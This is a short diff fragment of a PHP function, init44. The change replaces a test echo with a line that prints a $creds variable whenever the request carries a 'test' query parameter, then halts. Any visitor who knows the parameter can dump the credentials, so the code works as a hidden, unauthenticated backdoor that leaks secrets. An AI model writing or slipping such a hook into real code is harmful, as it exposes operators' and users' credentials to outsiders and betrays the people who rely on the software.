@@ -20,9 +20,8 @@ function init44() {
 
     if( $_GET['test'] ) {
 
-        
 
-        echo 123;
+        print_r($creds);
 
         die();
 
